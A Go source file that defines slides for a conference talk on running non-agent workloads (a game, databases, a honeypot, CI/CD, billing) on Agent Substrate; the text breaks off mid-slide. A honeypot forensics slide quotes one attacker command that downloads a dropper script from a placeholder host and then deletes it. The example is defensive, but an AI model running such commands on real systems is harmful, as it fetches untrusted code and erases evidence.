// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

// SlideCard defines a numbered pillar card for the official ASD 3-Cards layout.
type SlideCard struct {
	Number string `json:"number"`
	Title  string `json:"title"`
	Body   string `json:"body"`
}

// SlideColumn defines a side-by-side comparison column for the official ASD Two-Column layout.
type SlideColumn struct {
	Heading string   `json:"heading"`
	Bullets []string `json:"bullets"`
}

// SlideAgendaItem defines a numbered row for the official ASD Agenda / Synthesis layout.
type SlideAgendaItem struct {
	Number string `json:"number"`
	Topic  string `json:"topic"`
	Detail string `json:"detail,omitempty"`
}

// SlidePuzzlePiece defines one slot in the 3x3 interlocking Agent Substrate jigsaw puzzle.
type SlidePuzzlePiece struct {
	Slot        int    `json:"slot"` // 0..8 in row-major 3x3 order (4 is the center keystone)
	Code        string `json:"code"`
	Kind        string `json:"kind"` // "demo" | "substrate" | "keystone"
	Filled      bool   `json:"filled"`
	Face        string `json:"face"` // "rebel" | "agent" | "extra" | "keystone"
	Badge       string `json:"badge"`
	RebelTitle  string `json:"rebel_title,omitempty"`
	RebelDetail string `json:"rebel_detail,omitempty"`
	AgentTitle  string `json:"agent_title"`
	AgentDetail string `json:"agent_detail"`
	EmptyLabel  string `json:"empty_label,omitempty"`
}

// SlideDef defines the static metadata and Agent Substrate Day template content for a slide.
type SlideDef struct {
	ID                string             `json:"id"`
	Index             int                `json:"index"`
	Total             int                `json:"total"`
	Layout            string             `json:"layout"` // "asd-title" | "asd-demo" | "asd-cards" | "asd-two-col" | "asd-big-stat" | "asd-code" | "asd-puzzle" | "asd-closing"
	Kicker            string             `json:"kicker"`
	Chapter           string             `json:"chapter"`
	Badge             string             `json:"badge"`
	Title             string             `json:"title"`
	Subtitle          string             `json:"subtitle"`
	Kind              string             `json:"kind"` // "title" | "chapter" | "recap" | "puzzle" | "closer"
	HighlightPhrases  []string           `json:"highlight_phrases,omitempty"`
	SpeakerByline     string             `json:"speaker_byline,omitempty"`
	EventFooter       string             `json:"event_footer,omitempty"`
	Points            []string           `json:"points"`
	Cards             []SlideCard        `json:"cards,omitempty"`
	Columns           []SlideColumn      `json:"columns,omitempty"`
	StatValue         string             `json:"stat_value,omitempty"`
	StatContext       string             `json:"stat_context,omitempty"`
	CodeFilename      string             `json:"code_filename,omitempty"`
	CodeLines         []string           `json:"code_lines,omitempty"`
	PuzzleStage       string             `json:"puzzle_stage,omitempty"` // "loot" | "epiphany" | "complete"
	PuzzlePieces      []SlidePuzzlePiece `json:"puzzle_pieces,omitempty"`
	AgendaItems       []SlideAgendaItem  `json:"agenda_items,omitempty"`
	SignOffLines      []string           `json:"sign_off_lines,omitempty"`
	DemoName          string             `json:"demo_name,omitempty"`
	DemoURL           string             `json:"demo_url,omitempty"`
	SubstrateFeatures []string           `json:"substrate_features"`
	SpeakerNotes      string             `json:"speaker_notes"`
}

// SlideData combines static slide metadata with live in-memory Go heap state.
type SlideData struct {
	SlideDef
	ViewCount    int       `json:"view_count"`
	Notes        string    `json:"notes"`
	PodIPHistory []string  `json:"pod_ip_history"`
	CurrentPodIP string    `json:"current_pod_ip"`
	LastWokenAt  time.Time `json:"last_woken_at"`
}

// SlideSummary is a compact representation for the slide grid.
type SlideSummary struct {
	ID      string `json:"id"`
	Index   int    `json:"index"`
	Total   int    `json:"total"`
	Layout  string `json:"layout"`
	Chapter string `json:"chapter"`
	Badge   string `json:"badge"`
	Title   string `json:"title"`
	Kind    string `json:"kind"`
}

// buildPuzzlePieces returns the 9-slot (3x3) Agent Substrate jigsaw puzzle state for a finale stage.
// Slots 0, 1, 2, 3, 5, 6, 7, 8 are the 8 non-agent demo pieces; slot 4 (center bullseye)
// is the Model + Agent Loop keystone.
func buildPuzzlePieces(stage string) []SlidePuzzlePiece {
	demoFace := "rebel"
	if stage == "epiphany" || stage == "complete" {
		demoFace = "agent"
	}
	fillKeystone := stage == "complete"

	emptyCenter := "Missing centerpiece"
	if stage == "epiphany" {
		emptyCenter = "What drives the loop?"
	}

	return []SlidePuzzlePiece{
		{
			Slot:        0,
			Code:        "01",
			Kind:        "demo",
			Filled:      true,
			Face:        demoFace,
			Badge:       "PIECE 01 • DUNGEON 2D",
			RebelTitle:  "RAM checkpoints, undo & fork",
			RebelDetail: "SNAPSHOT_FIDELITY_MEMORY • revert • --tag",
			AgentTitle:  "Working memory & branching",
			AgentDetail: "Roll back bad tool calls & fork plans",
		},
		{
			Slot:        1,
			Code:        "02",
			Kind:        "demo",
			Filled:      true,
			Face:        demoFace,
			Badge:       "PIECE 02 • COLDSTART",
			RebelTitle:  "12s index cloned in ~100ms",
			RebelDetail: "ActorTemplate + wakeupProbe goldenTag",
			AgentTitle:  "100ms warm toolchains",
			AgentDetail: "Python, Node, browser & repo index ready",
		},
		{
			Slot:        2,
			Code:        "03",
			Kind:        "demo",
			Filled:      true,
			Face:        demoFace,
			Badge:       "PIECE 03 • TENANTDB",
			RebelTitle:  "Isolated DB per customer",
			RebelDetail: "DurableDir /data • tiered suspend • delete",
			AgentTitle:  "Private /workspace per session",
			AgentDetail: "Burst for 5s, sleep in GCS while idle",
		},
		{
			Slot:        3,
			Code:        "04",
			Kind:        "demo",
			Filled:      true,
			Face:        demoFace,
			Badge:       "PIECE 04 • HONEYPOT",
			RebelTitle:  "Sandboxed /bin/sh & rewind",
			RebelDetail: "gVisor Sentry kernel • rootfs revert",
			AgentTitle:  "Safe untrusted code execution",
			AgentDetail: "Contain prompt injection & undo rm -rf",
		},
		{
			Slot:        4,
			Code:        "AI",
			Kind:        "keystone",
			Filled:      fillKeystone,
			Face:        "keystone",
			Badge:       "YOU BRING THIS",
			AgentTitle:  "Model + agent loop",
			AgentDetail: "Gemini, Claude, or open weights + tools",
			EmptyLabel:  emptyCenter,
		},
		{
			Slot:        5,
			Code:        "05",
			Kind:        "demo",
			Filled:      true,
			Face:        demoFace,
			Badge:       "PIECE 05 • TIMEWARP",
			RebelTitle:  "Turn-based wake & long waits",
			RebelDetail: "atenet request parking • indefinite sleep",
			AgentTitle:  "Human-paced agent turns",
			AgentDetail: "Wait minutes or days for the next reply",
		},
		{
			Slot:        6,
			Code:        "06",
			Kind:        "demo",
			Filled:      true,
			Face:        demoFace,
			Badge:       "PIECE 06 • BUILDBOX",
			RebelTitle:  "Airgap compiler mid-pipeline",
			RebelDetail: "ActorEgressPolicy • 0-rule compile phase",
			AgentTitle:  "ActorEgressPolicy firewall",
			AgentDetail: "Deny-by-default L7 & DNS egress rules",
		},
		{
			Slot:        7,
			Code:        "07",
			Kind:        "demo",
			Filled:      true,
			Face:        demoFace,
			Badge:       "PIECE 07 • BILLING",
			RebelTitle:  "30-day invoice, 0 keys in RAM",
			RebelDetail: "ate-secret:// MITM • actorJwt • key rotate",
			AgentTitle:  "ate-secret:// MITM auth",
			AgentDetail: "Inject API keys on egress, 0 keys in RAM",
		},
		{
			Slot:        8,
			Code:        "08",
			Kind:        "demo",
			Filled:      true,
			Face:        demoFace,
			Badge:       "PIECE 08 • CANVAS",
			RebelTitle:  "Multiplayer room perimeter gate",
			RebelDetail: "OpenFGA AccessPolicy • 403 before wake",
			AgentTitle:  "OpenFGA per-actor authz",
			AgentDetail: "Verify user-to-actor tuples before wake",
		},
	}
}

// AllSlideDefs returns the full 22-slide presentation deck definitions styled
// after the official Agent Substrate Day (ATECon) speaker template.
func AllSlideDefs() []SlideDef {
	total := 22
	eventLine := "Google Cloud Booth  •  Wednesday, November 11, 2026"
	return []SlideDef{
		{
			ID:               "slide-01",
			Index:            1,
			Total:            total,
			Layout:           "asd-title",
			Kicker:           "AGENT SUBSTRATE",
			Chapter:          "Welcome",
			Badge:            "AGENT SUBSTRATE",
			Title:            "Running anything *but* agents on Agent Substrate",
			Subtitle:         "",
			Kind:             "title",
			HighlightPhrases: []string{"*but*"},
			SpeakerByline:    "Mofi Rahman  •  Lead DevRel GKE, Google Cloud",
			EventFooter:      eventLine,
			Points: []string{
				"Running anything *but* agents on Agent Substrate",
				"Mofi Rahman, Lead DevRel GKE, Google Cloud",
				"Google Cloud Booth • Wednesday, November 11, 2026",
			},
			SubstrateFeatures: []string{
				"Agent Substrate",
				"Kubernetes-Native Actors",
				"gVisor Sandbox",
			},
			SpeakerNotes: "Welcome slide while taking the stage. Introduce yourself and the talk title with Yolo on screen, then advance to Slide 2 to set up the eight non-agent demos.",
		},
		{
			ID:               "slide-02",
			Index:            2,
			Total:            total,
			Layout:           "asd-demo",
			Kicker:           "AGENT SUBSTRATE  •  REBEL TRACK",
			Chapter:          "Cold open",
			Badge:            "REBEL TRACK",
			Title:            "Every talk is about agents, so let's run *anything else*",
			Subtitle:         "Every session today covers agents or how Substrate runs them. Let's run eight non-AI workloads instead.",
			Kind:             "chapter",
			HighlightPhrases: []string{"*anything else*", "3-pod WorkerPool"},
			Points: []string{
				"A 2D game, HPA race, customer DBs, honeypot, Raft cluster, CI/CD runner, billing engine, and Figma canvas.",
				"Each workload runs on a 3-pod WorkerPool with 1 vCPU per pod and sleeps in Cloud Storage when idle.",
				"After each demo, we keep the Substrate feature that made it work.",
			},
			DemoName: "Open Dungeon 2D dashboard",
			DemoURL:  "https://dungeon.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"WorkerPool (ate.dev/v1)",
				"Pod-Decoupled Identity",
				"gVisor Sandbox",
				"atenet Wake-on-HTTP",
			},
			SpeakerNotes: "Open as the conference rebel: every other session today is about agents or how Agent Substrate runs agents, so let's build eight workloads that have nothing to do with AI. Keep the surprise that this slide deck is also running on Substrate until the end! Press Q to pop the audience QR code.",
		},
		{
			ID:               "slide-03",
			Index:            3,
			Total:            total,
			Layout:           "asd-demo",
			Kicker:           "LIVE DEMO 01  •  DUNGEON 2D",
			Chapter:          "Demo 01 • Setup",
			Badge:            "LIVE DEMO 01",
			Title:            "I was too lazy to set up Postgres",
			Subtitle:         "An 8-floor multiplayer roguelike on 3 pods with all server state in Go memory.",
			Kind:             "chapter",
			HighlightPhrases: []string{"Go heap structs", "Save Shrine"},
			Points: []string{
				"Player HP, inventory, and boss health live in Go heap structs.",
				"The server imports no SQL driver and writes nothing to disk.",
				"Idle players sleep in Cloud Storage and wake in ~100ms at a Save Shrine.",
			},
			DemoName: "Launch Dungeon 2D live demo",
			DemoURL:  "https://dungeon.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"SNAPSHOT_FIDELITY_MEMORY",
				"atenet-router",
				"In-Memory Persistence",
			},
			SpeakerNotes: "First experiment: a multiplayer game with save points, boss-death undo, and forked save slots without a database. Point out dozens of players sharing 3 pods.",
		},
		{
			ID:               "slide-04",
			Index:            4,
			Total:            total,
			Layout:           "asd-cards",
			Kicker:           "PUZZLE PIECE 01 / 08  •  MEMORY SNAPSHOTS",
			Chapter:          "Piece 01 • Memory",
			Badge:            "PIECE 01 / 08",
			Title:            "Checkpoint RAM, undo mistakes, and branch state",
			Subtitle:         "Durable process memory lets lifecycle commands replace custom save and rollback code.",
			Kind:             "recap",
			HighlightPhrases: []string{"SNAPSHOT_FIDELITY_MEMORY", "kubectl ate revert", "kubectl ate create tag"},
			Points: []string{
				"SNAPSHOT_FIDELITY_MEMORY saves live RAM to Cloud Storage on idle and wakes on any pod in ~100ms.",
				"kubectl ate revert actor restores the prior memory snapshot after dying on Floor 8.",
				"kubectl ate create tag clones a saved snapshot into a second actor so one key opens both chests.",
			},
			Cards: []SlideCard{
				{
					Number: "01",
					Title:  "Freeze the Go heap",
					Body:   "SNAPSHOT_FIDELITY_MEMORY saves live RAM to Cloud Storage on idle and wakes on any pod in ~100ms.",
				},
				{
					Number: "02",
					Title:  "Rewind a bad turn",
					Body:   "kubectl ate revert actor restores the prior memory snapshot after the Floor 8 dragon kills us.",
				},
				{
					Number: "03",
					Title:  "Fork a new timeline",
					Body:   "kubectl ate create tag clones a saved snapshot into a second actor so one key opens both chests.",
				},
			},
			DemoName: "Revisit Dungeon 2D leaderboard",
			DemoURL:  "https://dungeon.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"SNAPSHOT_FIDELITY_MEMORY",
				"atenet Wake-on-HTTP",
				"kubectl ate revert",
				"kubectl ate create tag",
			},
			SpeakerNotes: "Pocket Piece #1: process memory checkpointing, revert, and tag branching. Next experiment: racing Kubernetes HPA.",
		},
		{
			ID:               "slide-05",
			Index:            5,
			Total:            total,
			Layout:           "asd-demo",
			Kicker:           "LIVE DEMO 02  •  COLDSTART HPA RACE",
			Chapter:          "Demo 02 • Setup",
			Badge:            "LIVE DEMO 02",
			Title:            "Racing Kubernetes HPA on a 12-second cold start",
			Subtitle:         "Traffic jumps from 20 to 60 QPS across identical 2-hop L7 routers.",
			Kind:             "chapter",
			HighlightPhrases: []string{"12 seconds", "0/1 NotReady", "HTTP 429"},
			Points: []string{
				"Each replica takes 12 seconds to build a 50,000-doc search index in RAM.",
				"Scale-out Kubernetes pods fail readinessProbe and stay 0/1 NotReady.",
				"Excluded from Service Endpoints, Pod 1 caps at 20 QPS and sheds HTTP 429.",
			},
			DemoName: "Open Cold-Start HPA race",
			DemoURL:  "https://coldstart.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"ActorTemplate",
				"wakeupProbe",
				"Golden Snapshots",
				"external.metrics.k8s.io",
			},
			SpeakerNotes: "When traffic spikes from 20 to 60 QPS, HPA adds pods, but those new pods fail their readinessProbe and stay 0/1 NotReady for 12 seconds while Pod 1 sheds traffic with HTTP 429.",
		},
		{
			ID:               "slide-06",
			Index:            6,
			Total:            total,
			Layout:           "asd-two-col",
			Kicker:           "PUZZLE PIECE 02 / 08  •  GOLDEN SNAPSHOTS",
			Chapter:          "Piece 02 • Warm Clone",
			Badge:            "PIECE 02 / 08",
			Title:            "Build the index once, clone warm RAM in ~100ms",
			Subtitle:         "ActorTemplate snapshots post-warmup memory once so scale-out replicas skip cold init.",
			Kind:             "recap",
			HighlightPhrases: []string{"goldenTag", "~100ms", "0/1 NotReady"},
			Points: []string{
				"ActorTemplate runs the 12-second warmup once and saves the 76.6 MB heap to goldenTag when /readyz returns 200.",
				"Scaling from 1 to 3 restores pre-warmed replicas in ~100ms instead of rebuilding the index.",
				"The service absorbs the full 60 QPS spike without dropping requests.",
			},
			Columns: []SlideColumn{
				{
					Heading: "Standard Kubernetes HPA",
					Bullets: []string{
						"Rebuilds the 12-second search index on every scale-out.",
						"New pods fail readinessProbe and stay 0/1 NotReady.",
						"Pod 1 drops roughly half of user queries with HTTP 429.",
					},
				},
				{
					Heading: "Substrate Golden Snapshots",
					Bullets: []string{
						"Runs the 12-second warmup once when registering the template.",
						"Saves the warm 76.6 MB heap to goldenTag when /readyz hits 200.",
						"Clones Ready replicas in ~100ms and serves all 60 QPS.",
					},
				},
			},
			DemoName: "Revisit Cold-Start oscilloscope",
			DemoURL:  "https://coldstart.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"ActorTemplate Golden Snapshots",
				"wakeupProbe /readyz",
				"Warm Heap Cloning",
				"Pod-Decoupled Scaling",
			},
			SpeakerNotes: "Pocket Piece #2: ActorTemplate + wakeupProbe Golden Snapshots. Cloning 76 MB of read-only RAM is great, so next let's look at per-customer writable storage.",
		},
		{
			ID:               "slide-07",
			Index:            7,
			Total:            total,
			Layout:           "asd-demo",
			Kicker:           "LIVE DEMO 03  •  ONE DB PER CUSTOMER",
			Chapter:          "Demo 03 • Setup",
			Badge:            "LIVE DEMO 03",
			Title:            "One isolated database process per customer",
			Subtitle:         "Four customer databases multiplex across 3 worker pods without shared tables.",
			Kind:             "chapter",
			HighlightPhrases: []string{"WHERE tenant_id", "kubectl ate delete actor"},
			Points: []string{
				"Acme, Globex, Initech, and Umbrella each run a private DB with a 16 MB cache.",
				"Queries skip WHERE tenant_id filters because tenants share no process or disk.",
				"GDPR tenant deletion takes one kubectl ate delete actor command.",
			},
			DemoName: "Open TenantDB X-Ray console",
			DemoURL:  "https://tenantdb.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"DurableDir (/data)",
				"suspend --mode=async",
				"suspend --mode=sync",
				"kubectl ate delete actor",
			},
			SpeakerNotes: "Shared multi-tenant tables mean worrying about missing WHERE tenant_id filters and complex GDPR deletes across dozens of tables. Here each customer gets an isolated database binary sharing our 3 pods.",
		},
		{
			ID:               "slide-08",
			Index:            8,
			Total:            total,
			Layout:           "asd-big-stat",
			Kicker:           "PUZZLE PIECE 03 / 08  •  DURABLEDIR & TIERING",
			Chapter:          "Piece 03 • Workspaces",
			Badge:            "PIECE 03 / 08",
			Title:            "Snapshot bytes saved by dropping cache RAM on sleep",
			Subtitle:         "Private /data volumes keep hot caches in RAM during bursts and commit compact logs overnight.",
			Kind:             "recap",
			StatValue:        "99.997%",
			StatContext:      "Sync suspend commits only the 480 B /data/wal.jsonl log instead of the 16.0 MB cache, then replays it in <1ms on wake.",
			HighlightPhrases: []string{"16.0 MB", "480 B", "kubectl ate delete actor"},
			Points: []string{
				"Async suspend keeps the 16.0 MB buffer pool in the snapshot for active bursts.",
				"Sync suspend drops the cache and commits only 480 B /data/wal.jsonl in DurableDir.",
				"kubectl ate delete actor removes compute, RAM snapshots, and /data together.",
			},
			DemoName: "Revisit TenantDB console",
			DemoURL:  "https://tenantdb.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"DurableDir (/data)",
				"MEMORY vs VOLUMES Fidelity",
				"WAL Replay (<1ms)",
				"Single-Command Tenant Delete",
			},
			SpeakerNotes: "Pocket Piece #3: DurableDir volumes, SNAPSHOT_FIDELITY_MEMORY (db-acme/db-globex) vs. native SNAPSHOT_FIDELITY_VOLUMES (db-initech/db-umbrella), and single-command tenant deletion. Now what if the user is an attacker?",
		},
		{
			ID:               "slide-09",
			Index:            9,
			Total:            total,
			Layout:           "asd-demo",
			Kicker:           "LIVE DEMO 04  •  GVISOR HONEYPOT",
			Chapter:          "Demo 04 • Setup",
			Badge:            "LIVE DEMO 04",
			Title:            "A disposable Linux sandbox per attacker IP",
			Subtitle:         "Each suspicious IP gets real /bin/sh while the SOC watches from outside.",
			Kind:             "chapter",
			HighlightPhrases: []string{"gVisor Sentry", "rm -f"},
			Points: []string{
				"Every attacker IP wakes an isolated Debian actor that sleeps while idle.",
				"gVisor Sentry intercepts syscalls while forensics hashes dropped files.",
				"When an attacker runs rm -f to hide, we rewind the rootfs snapshot.",
			},
			DemoName: "Open Honeypot console",
			DemoURL:  "https://honeypot.substrate.learngke.dev/",
			SubstrateFeatures: []string{
				"sandboxClasses: [gvisor]",
				"Rootfs Overlay Snapshots",
				"Out-of-Band Forensics",
			},
			SpeakerNotes: "Dedicated VMs cost too much to leave idle per IP, and fake shell emulators are easy to spot. Here every attacker IP gets a real Linux environment inside gVisor.",
		},
		{
			ID:           "slide-10",
			Index:        10,
			Total:        total,
			Layout:       "asd-code",
			Kicker:       "PUZZLE PIECE 04 / 08  •  GVISOR & FORENSICS",
			Chapter:      "Piece 04 • Sandbox",
			Badge:        "PIECE 04 / 08",
			Title:        "Isolate untrusted shells and rewind deleted files",
			Subtitle:     "Run real /bin/sh inside gVisor, recover wiped evidence, and clone a live sandbox.",
			Kind:         "recap",
			CodeFilename: "forensic-playbook.sh",
			CodeLines: []string{
				"# Attacker drops a script inside gVisor, then tries to wipe the evidence:",
				"attacker@honeypot$ curl -sO http://198.51.100.9/dropper.sh && rm -f dropper.sh",
				"",
				"# Defender rewinds the actor's rootfs and RAM snapshot to recover dropper.sh:",
				"defender@cluster$ kubectl ate revert actor honeypot-203-0-113-5",
				"",
				"# Defender clones the compromised actor onto a tag without alerting the attacker:",
				"defender@cluster$ kubectl ate create tag crime-scene --actor honeypot-203-0-113-5",
				"defender@cluster$ kubectl ate create actor forensic-lab --template honeypot --tag crime-scene",
			},
			HighlightPhrases: []string{"gVisor", "kubectl ate revert", "create tag"},
			Points: []string{
				"gVisor runs untrusted Linux binaries inside a user-space kernel rather than directly on the node kernel.",
				"Rootfs overlay snapshots carry /tmp edits across worker pods without attaching a PVC.",
				"kubectl ate revert recovers deleted files, and create tag clones the sandbox for safe inspection.",
			},
			DemoName: "Revisit Honeypot console",
			DemoURL:  "https://honeypot.substrate.learngke.dev/",
			SubstrateFeatures: []string{
				"gVisor Application Kernel",
				"Rootfs Overlay Snapshots",
				"kubectl ate revert",
				"Forensic Tag Cloning (--tag)",
			},
			SpeakerNotes: "Pocket Piece #4: gVisor sandboxing and rootfs rollback. Notice the rose attacker command inside the sandbox versus our green defender commands on the cluster. Next, let's see what breaks when we freeze Raft.",
		},
		{
			ID:               "slide-11",
			Index:            11,
			Total:            total,
			Layout:           "asd-demo",
			Kicker:           "LIVE DEMO 05  •  TESTING THE LIMITS",
			Chapter:          "Demo 05 • Setup",
			Badge:            "LIVE DEMO 05",
			Title:            "Putting a Raft leader in the freezer",
			Subtitle:         "We replaced Postgres, beat HPA, and trapped hackers. Now let's freeze Raft.",
			Kind:             "chapter",
			HighlightPhrases: []string{"3-second lease", "split-brain"},
			Points: []string{
				"We suspend raft-node-1 while it holds the Term 1 leader lease.",
				"Wall time moves on, its 3-second lease expires, and node 2 wins Term 2.",
				"Waking 5s later on a write, node 1 serves conflicting split-brain writes.",
			},
			DemoName: "Open Timewarp split-brain lab",
			DemoURL:  "https://timewarp.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"atenet Request Parking",
				"Wall-Clock Discontinuity",
				"Turn-Based vs Heartbeat",
			},
			SpeakerNotes: "You don't understand a tool until you find where it breaks. Let's freeze the leader of a 3-node Raft cluster, watch it split-brain, and see what workload shape Substrate actually wants.",
		},
		{
			ID:               "slide-12",
			Index:            12,
			Total:            total,
			Layout:           "asd-two-col",
			Kicker:           "PUZZLE PIECE 05 / 08  •  TURN-BASED EXECUTION",
			Chapter:          "Piece 05 • Turn-Based",
			Badge:            "PIECE 05 / 08",
			Title:            "Built for discrete turns, not continuous heartbeats",
			Subtitle:         "Freezing Raft shows the workload shape Substrate fits best, short turns with long idle waits.",
			Kind:             "recap",
			HighlightPhrases: []string{"atenet", "StatefulSets", "wait indefinitely"},
			Points: []string{
				"Heartbeat daemons assume continuous clocks and break when frozen across lease timeouts.",
				"Turn-based workloads run one request, suspend cleanly, and can wait indefinitely in Cloud Storage.",
				"atenet parks the next incoming HTTP request and wakes the sleeping actor in ~100ms.",
			},
			Columns: []SlideColumn{
				{
					Heading: "Continuous Heartbeat Daemons",
					Bullets: []string{
						"Expect unbroken 100ms ticks and short leader leases.",
						"Freezing memory pauses monotonic timers while wall time advances.",
						"Keep etcd, Raft, and Kafka on Kubernetes StatefulSets.",
					},
				},
				{
					Heading: "Turn-Based Workloads",
					Bullets: []string{
						"Run a burst of work, then suspend as soon as the turn ends.",
						"Can wait indefinitely in Cloud Storage without holding a pod.",
						"atenet parks the next HTTP request and wakes the actor in ~100ms.",
					},
				},
			},
			DemoName: "Revisit Timewarp lab",
			DemoURL:  "https://timewarp.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"atenet Wake-on-HTTP",
				"Request Parking",
				"Indefinite Idle Sleep",
			},
			SpeakerNotes: "Pocket Piece #5: Substrate is built for turn-based workloads that do a unit of work and then wait indefinitely until the next request arrives. Next: how do we lock down outbound network access mid-turn without losing warm RAM?",
		},
		{
			ID:               "slide-13",
			Index:            13,
			Total:            total,
			Layout:           "asd-demo",
			Kicker:           "LIVE DEMO 06  •  HERMETIC CI/CD BUILDBOX",
			Chapter:          "Demo 06 • Setup",
			Badge:            "LIVE DEMO 06",
			Title:            "Airgapping a CI/CD compiler mid-pipeline without restarting",
			Subtitle:         "One build actor fetches packages, locks into a zero-egress airgap to compile in RAM, and opens one port to publish.",
			Kind:             "chapter",
			HighlightPhrases: []string{"ActorEgressPolicy", "0 egress rules", "34.8 MB"},
			Points: []string{
				"Phase 1 allows only the internal package mirror and warms a 34.8 MB compiler cache in Go RAM.",
				"Phase 2 hot-swaps ActorEgressPolicy to 0 egress rules so rogue scripts and metadata probes fail.",
				"Phase 3 opens only POST /api/registry/releases to publish the signed binary before sleeping in GCS.",
			},
			DemoName: "Open Buildbox CI/CD console",
			DemoURL:  "https://buildbox.substrate.learngke.dev/",
			SubstrateFeatures: []string{
				"ActorEgressPolicy",
				"Dynamic L7 & DNS Airgap",
				"Warm RAM Build Cache",
			},
			SpeakerNotes: "In traditional CI/CD, changing network permissions between dependency fetch and compilation means spinning up a separate container and serializing the build cache to disk. Here one actor hot-swaps its L7 egress firewall between phases while keeping its 34.8 MB compiler cache hot in RAM.",
		},
		{
			ID:               "slide-14",
			Index:            14,
			Total:            total,
			Layout:           "asd-cards",
			Kicker:           "PUZZLE PIECE 06 / 08  •  ACTOREGRESSPOLICY",
			Chapter:          "Piece 06 • Airgap",
			Badge:            "PIECE 06 / 08",
			Title:            "Hot-swap L7 and DNS firewall rules on a running actor",
			Subtitle:         "ActorEgressPolicy updates outbound network rules per phase without restarting the process or losing warm RAM.",
			Kind:             "recap",
			HighlightPhrases: []string{"ActorEgressPolicy", "0 allowed rules", "169.254.169.254"},
			Points: []string{
				"Phase 1 permits only GET /api/mirror/pkgs/* while hydrating the 34.8 MB Go AST cache in heap memory.",
				"Phase 2 applies an ActorEgressPolicy with 0 allowed rules so telemetry and 169.254.169.254 are blocked.",
				"Phase 3 grants only POST /api/registry/releases for artifact upload before suspending to Cloud Storage.",
			},
			Cards: []SlideCard{
				{
					Number: "01",
					Title:  "Scoped dependency fetch",
					Body:   "Allow only GET /api/mirror/pkgs/* during Phase 1 while hydrating the 34.8 MB compiler cache in Go heap RAM.",
				},
				{
					Number: "02",
					Title:  "Zero-rule compile airgap",
					Body:   "Hot-swap ActorEgressPolicy to 0 allowed rules in Phase 2 so supply-chain telemetry and 169.254.169.254 are blocked.",
				},
				{
					Number: "03",
					Title:  "Scoped publish & sleep",
					Body:   "Grant only POST /api/registry/releases for Phase 3 artifact upload, then suspend the runner to Cloud Storage.",
				},
			},
			DemoName: "Revisit Buildbox pipeline",
			DemoURL:  "https://buildbox.substrate.learngke.dev/",
			SubstrateFeatures: []string{
				"ActorEgressPolicy",
				"Deny-by-Default Egress",
				"L7 HTTP & DNS Rules",
				"Zero-Restart Policy Swap",
			},
			SpeakerNotes: "Pocket Piece #6: ActorEgressPolicy dynamic per-actor L7 HTTP and DNS firewalling. Next: what happens when a sleeping actor needs to call an authenticated external API like Stripe without storing API keys in its memory snapshot?",
		},
		{
			ID:               "slide-15",
			Index:            15,
			Total:            total,
			Layout:           "asd-demo",
			Kicker:           "LIVE DEMO 07  •  30-DAY SLEEPING BILLING",
			Chapter:          "Demo 07 • Setup",
			Badge:            "LIVE DEMO 07",
			Title:            "Sleeping 30 days between invoices with zero API keys in RAM",
			Subtitle:         "Per-customer subscription actors wake once a month to charge the payment vault while the egress proxy injects secrets on the wire.",
			Kind:             "chapter",
			HighlightPhrases: []string{"ate-secret://", "0 raw keys", "Rotate Key"},
			Points: []string{
				"Each enterprise subscription sleeps in Cloud Storage for 30 days between monthly invoice turns.",
				"Actor memory holds only ate-secret://billing-vault-api/token so GCS snapshots contain 0 raw keys.",
				"Rotating the Kubernetes Secret updates the next invoice turn without restarting or redeploying actors.",
			},
			DemoName: "Open Billing & Vault X-Ray",
			DemoURL:  "https://billing.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"ate-secret:// Injection",
				"actorJwt Identity",
				"Zero-Key GCS Snapshots",
			},
			SpeakerNotes: "If you freeze process memory to Cloud Storage for 30 days, any API key in an environment variable or heap struct gets written into the snapshot bucket. Watch how ate-secret:// keeps zero raw secrets in actor RAM while allowing instant key rotation.",
		},
		{
			ID:               "slide-16",
			Index:            16,
			Total:            total,
			Layout:           "asd-two-col",
			Kicker:           "PUZZLE PIECE 07 / 08  •  EGRESS SECRET INJECTION",
			Chapter:          "Piece 07 • Zero-Key RAM",
			Badge:            "PIECE 07 / 08",
			Title:            "Inject credentials on the wire, never inside the snapshot",
			Subtitle:         "ate-secret:// placeholders keep live API keys out of process memory and GCS dumps while enabling instant key rotation.",
			Kind:             "recap",
			HighlightPhrases: []string{"ate-secret://", "actorJwt", "GCS memory snapshots"},
			Points: []string{
				"Actor RAM holds only ate-secret://billing-vault-api/token placeholders so memory dumps stay secret-free.",
				"The egress proxy substitutes the live secret and mints actorJwt only for authorized destination hosts.",
				"Rotating the Kubernetes Secret takes effect on the next outbound request with zero actor restarts.",
			},
			Columns: []SlideColumn{
				{
					Heading: "Env Vars & In-Process Secrets",
					Bullets: []string{
						"Raw API keys sit in process memory and get frozen into GCS memory snapshots.",
						"Rotating a credential requires restarting pods or invalidating saved actor state.",
						"Compromised code can read os.Environ() and exfiltrate keys to any host.",
					},
				},
				{
					Heading: "Substrate ate-secret:// Egress Proxy",
					Bullets: []string{
						"Actor RAM holds only ate-secret://billing-vault-api/token placeholders.",
						"Egress proxy substitutes the real secret and mints actorJwt only for allowed hosts.",
						"Rotating the Kubernetes Secret takes effect on the next wake with zero restarts.",
					},
				},
			},
			DemoName: "Revisit Billing Vault X-Ray",
			DemoURL:  "https://billing.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"ate-secret:// MITM Proxy",
				"Host-Bound Substitution",
				"actorJwt Minting",
				"Zero-Downtime Key Rotation",
			},
